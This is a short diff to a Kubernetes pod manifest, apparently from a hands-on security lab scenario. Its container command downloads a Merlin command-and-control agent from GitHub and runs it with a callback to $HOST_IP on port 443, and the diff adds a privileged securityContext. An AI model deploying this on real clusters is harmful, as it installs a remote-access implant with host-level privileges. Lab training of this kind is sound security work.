@@ -30,6 +30,8 @@ spec:
   - name: priv-container
     image: ubuntu
     command: [ "sh", "-c", "apt update && apt install wget -y && wget https://github.com/g3rzi/katacodaScenario/releases/download/0.1/merlinAgent-Linux-x64 && chmod +x merlinAgent-Linux-x64 && ./merlinAgent-Linux-x64 -url https://$HOST_IP:443", "sleep infinity" ]
+    securityContext:
+      privileged: true
 EOF```{{execute T2}}  
 
 
